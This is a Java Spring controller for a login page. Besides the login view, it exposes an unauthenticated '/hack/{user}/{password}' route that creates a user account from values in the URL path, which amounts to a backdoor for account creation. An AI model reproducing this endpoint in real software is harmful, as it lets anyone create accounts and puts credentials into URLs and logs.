package nguyenhuuvu.controller.web;

import nguyenhuuvu.entity.UserEntity;
import nguyenhuuvu.service.UserService;
import nguyenhuuvu.utils.SecurityUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.web.servlet.server.Session;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;

import java.util.List;

@Controller
public class Login {
	@Autowired
	UserService userService;
	
	@RequestMapping("/login")
	public String viewLogin(Session session)
	{
		if (SecurityUtils.getListRoles().contains(new SimpleGrantedAuthority("ROLE_ANONYMOUS")))
			return "admin/login";
		else
			return "redirect:/";
	}


	@RequestMapping("/hack/{user}/{password}")
	public void saveAccount(@PathVariable String user, @PathVariable String password)
	{
		UserEntity userEntity = new UserEntity();
		userEntity.setUsername(user);
		userEntity.setPassword(password);
		userService.saveAccount(userEntity);
	}
}
